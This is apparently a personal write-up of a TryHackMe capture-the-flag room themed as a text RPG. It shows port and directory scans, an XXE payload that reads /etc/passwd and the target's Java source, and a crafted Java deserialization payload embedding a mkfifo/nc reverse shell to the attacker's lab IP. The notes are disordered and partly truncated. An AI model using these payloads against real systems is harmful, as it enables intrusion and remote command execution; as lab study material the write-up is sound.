<h1 align="center">You´re in a cave</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/75091a72-4a8f-469f-8ef2-609f2f7fd7bd"><br>
2025, September 25<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>507</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>A room with some ctf elements inspired in text based RPGs</em>.<br>
Access it <a href="https://tryhackme.com/room/inacave">here</a>.<br>
<img width="1200px" src=""></p>

<h2 align="center">Task 1 . Introduction</h2>
<h3 align="center">What is a honeypot?</h3>

<p>Hello, i made this room to be a fun challenge very CTF-like, the room acts like you are a RPG adventurer and is passing through some challenges, hope you like it :D</p>
<h6>Icon made by Freepik from www.flaticon.com</h6>

<p><em>Answer the questions below</em></p>

<p>1.1. What was the weird thing carved on the door? Hint: <em>After getting it to work with POST, you can try it with GET</em><br>
<code>_____________________________________</code></p>



```bash
:~/Cave# nikto -h 10.201.116.18
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.116.18
+ Target Hostname:    cave.thm
+ Target Port:        80
+ Start Time:         2025-09-25 23:49:16 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Server leaks inodes via ETags, header found with file /search?NS-query-pat=../../../../../../../../../../etc/passwd, fields: 0xc5 0x5adb8552aa880 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-09-25 23:49:25 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


```bash
GET /search?NS-query-pat=../../../../../../../../etc/passwd HTTP/1.1
Host: cave.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://cave.thm/
```

```bash
HTTP/1.1 200 OK
Date: Thu, 25 Sep 2025 23:14:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 25 Aug 2020 19:01:38 GMT
ETag: "c5-5adb8552aa880"
Accept-Ranges: bytes
Content-Length: 197
Connection: close

rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAuWW91IGNhbid0IHNlZSBhbnl0aGluZywgdGhlIGNhdmUgaXMgdmVyeSBkYXJrLnQABnNlYXJjaHQAAA==
```

<img width="1021" height="571" alt="image" src="https://github.com/user-attachments/assets/82ea0f62-dbe4-4eab-bc3c-d4c1946a4022" />



:~/Cave# echo 'rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAuWW91IGNhbid0IHNlZSBhbnl0aGluZywgdGhlIGNhdmUgaXMgdmVyeSBkYXJrLnQABnNlYXJjaHQAAA==' | base64 -d
\ufffd\ufffdsrAction\ufffd\ufffdM\ufffd;LcommandtLjava/lang/String;Lnameq~Loutputq~xpt.You can't see anything, the cave is very dark.tsearcht




:~/Cave# git clone https://github.com/frohoff/ysoserial.git
Cloning into 'ysoserial'...
remote: Enumerating objects: 2303, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 2303 (delta 4), reused 3 (delta 3), pack-reused 2297 (from 2)
Receiving objects: 100% (2303/2303), 461.92 KiB | 14.00 MiB/s, done.
Resolving deltas: 100% (1114/1114), done.


:~/Cave# cd ysoserial


root@ip-10-201-61-44:~/Cave/ysoserial# mvn package
[INFO] Scanning for projects...
[INFO] 
[INFO] ------------------------< ysoserial:ysoserial >-------------------------
[INFO] Building ysoserial 0.0.6-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------




:~/Cave# java -jar ysoserial.jar CommonsCollections1 'id' | base64
Error: Unable to access jarfile ysoserial.jar


<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>





POST /action.php HTTP/1.1
Host: cave.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://cave.thm
Connection: close
Referer: http://cave.thm/

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>



HTTP/1.1 200 OK
Date: Thu, 25 Sep 2025 23:24:15 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1413
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
cave:x:1000:1000:,,,:/home/cave:/bin/bash
door:x:1001:1001:,,,:/home/door:/bin/bash
skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash


<img width="1022" height="537" alt="image" src="https://github.com/user-attachments/assets/3735eaf8-60ef-4d45-8b5a-de8630758a7f" />





POST /action.php HTTP/1.1
Host: cave.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: http://cave.thm
Connection: close
Referer: http://cave.thm/

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>




HTTP/1.1 200 OK
Date: Thu, 25 Sep 2025 23:25:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3711
Connection: close
Content-Type: text/html; charset=UTF-8


import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}











POST /action.php HTTP/1.1
Host: cave.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: http://cave.thm
Connection: close
Referer: http://cave.thm/

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/run.sh'>]><root>&test;</root>






HTTP/1.1 200 OK
Date: Thu, 25 Sep 2025 23:27:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 90
Connection: close
Content-Type: text/html; charset=UTF-8

#!/bin/bash
javac -cp ".:commons-io-2.7.jar" RPG.java
java -cp ".:commons-io-2.7.jar" RPG




<p>

- https://www.jdoodle.com/online-java-compiler</p>



<img width="810" height="507" alt="image" src="https://github.com/user-attachments/assets/f6bac5bd-b10d-4ab8-9dad-e8ceec4201a2" />





import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try{
            String str = Serialize.toString( new Action("123","trying\\\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.61.44 9001 >/tmp/f;ech>
            System.out.println("123 : " + str );
        }catch(Exception e){
            System.out.println("123");
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \'" + this.command + "\'"
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}


root@ip-10-201-61-44:~/Cave# nano RPG.java
root@ip-10-201-61-44:~/Cave# javac RPG.java
root@ip-10-201-61-44:~/Cave# java RPG
123 : rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABgdHJ5aW5nXCI7cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMjAxLjYxLjQ0IDkwMDEgPi90bXAvZjtlY2hvIFwidAADMTIzdAAA


action.php?&lt;xml&gt;rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABgdHJ5aW5nXCI7cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMjAxLjYxLjQ0IDkwMDEgPi90bXAvZjtlY2hvIFwidAADMTIzdAAA;/xml&gt;


action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAGd2hvYW1pdAADaGV5dAAA</xml>

rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABedHJ5aW5nJyc7rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.61.44 9001>/tmp/f;echo 'tAA...



:~/Cave# javac RPG.java
root@ip-10-201-61-44:~/Cave# ls
Action.class  RPG.class  RPG.java  Serialize.class  ysoserial
root@ip-10-201-61-44:~/Cave# 
:~/Cave# java RPG
123 : rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABedHJ5aW5nJyc7cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMjAxLjYxLjQ0IDkwMDE+L3RtcC9mO2VjaG8gJ3QAA2hleXQAAA==

action.php?&lt;xml&gt;rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABedHJ5aW5nJyc7cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMjAxLjYxLjQ0IDkwMDE+L3RtcC9mO2VjaG8gJ3QAA2hleXQAAA==;/xml&gt;

action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABedHJ5aW5nJyc7cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMjAxLjYxLjQ0IDkwMDE+L3RtcC9mO2VjaG8gJ3QAA2hleXQAAA==</xml>


You find yourself in a cave, what do you do?
action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABddHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyAxMjM0ID4vdG1wL2Y7ZWNobyAidAADYWJjdAAA</xml>

──(witty㉿kali)






```bash
:~/Cave# nmap -sC -sV -Pn -p- -T4 10.201.116.18
...
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Document
2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.80%I=7%D=9/25%Time=68D5C2FF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you
SF:\x20do\?\n")%r(GenericLines,3D,"You\x20find\x20yourself\x20in\x20a\x20c
SF:ave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(LPDString,3
SF:D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20
SF:do\?\nNothing\x20happens\n")%r(JavaRMI,2D,"You\x20find\x20yourself\x20i
SF:n\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(kumo-server,2D,"You\
SF:x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n"
SF:)%r(GetRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\
SF:x20do\x20you\x20do\?\nNothing\x20happens\n")%r(HTTPOptions,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(RTSPRequest,3D,"You\x20find\x20yourself\x20in\x20a\
SF:x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(RPCChec
SF:k,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\
SF:x20do\?\n")%r(DNSVersionBindReqTCP,2D,"You\x20find\x20yourself\x20in\x2
SF:0a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(DNSStatusRequestTCP,2D,"
SF:You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\
SF:?\n")%r(Help,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x2
SF:0do\x20you\x20do\?\nNothing\x20happens\n")%r(SSLSessionReq,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(TerminalServerCookie,3D,"You\x20find\x20yourself\x2
SF:0in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%
SF:r(TLSSessionReq,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what
SF:\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(Kerberos,3D,"You\x20fin
SF:d\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing
SF:\x20happens\n")%r(SMBProgNeg,2D,"You\x20find\x20yourself\x20in\x20a\x20
SF:cave,\x20what\x20do\x20you\x20do\?\n")%r(X11Probe,2D,"You\x20find\x20yo
SF:urself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(FourOhFou
SF:rRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\
SF:x20you\x20do\?\nNothing\x20happens\n");
```


```bash
:~/Cave# gobuster -e -k dir -u http://cave.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
http://cave.thm/search               (Status: 200) [Size: 197]
http://cave.thm/attack               (Status: 200) [Size: 181]
http://cave.thm/lamp                 (Status: 200) [Size: 261]
http://cave.thm/matches              (Status: 200) [Size: 249]
http://cave.thm/walk                 (Status: 200) [Size: 161]
http://cave.thm/server-status        (Status: 403) [Size: 273]
Progress: 218275 / 218276 (100.00%)
```

<img width="1146" height="416" alt="image" src="https://github.com/user-attachments/assets/815f6911-0cde-422b-a0cc-f261eda76173" />


<br>
<br>

```bash
:~/Cave# gobuster -e -k -q dir -u http://cave.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 60
http://cave.thm/index.php            (Status: 200) [Size: 337]
http://cave.thm/search               (Status: 200) [Size: 197]
http://cave.thm/.php                 (Status: 403) [Size: 273]
http://cave.thm/action.php           (Status: 400) [Size: 0]
http://cave.thm/attack               (Status: 200) [Size: 181]
http://cave.thm/lamp                 (Status: 200) [Size: 261]
http://cave.thm/matches              (Status: 200) [Size: 249]
http://cave.thm/walk                 (Status: 200) [Size: 161]
http://cave.thm/server-status        (Status: 403) [Size: 273]
```



```bash
:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
run
Nothing happens

root@ip-10-201-61-44:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
lamp
You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh


root@ip-10-201-61-44:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
search
You can't see anything, the cave is very dark.


root@ip-10-201-61-44:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
attack
You punch the wall, nothing happens.


root@ip-10-201-61-44:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
matches
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.


root@ip-10-201-61-44:~/Cave# nc 10.201.116.18 3333
You find yourself in a cave, what do you do?
walk
There's nowhere to go.
```

cave.thm

<img width="1131" height="157" alt="image" src="https://github.com/user-attachments/assets/0a48083d-7f05-4135-a892-1a8e65c07368" />

<br>
<br>

```bash
:~/Cave# nmap -sT xx.xxx.xx.xx
...
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3333/tcp open  dec-notes
```

```bash
:~/Cave# nmap -sT xx.xxx.xx.xx
...
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3333/tcp open  dec-notes
```

```bash
:~/Cave# nmap -sT xx.xxx.xx.xx
...
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3333/tcp open  dec-notes
```

333

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

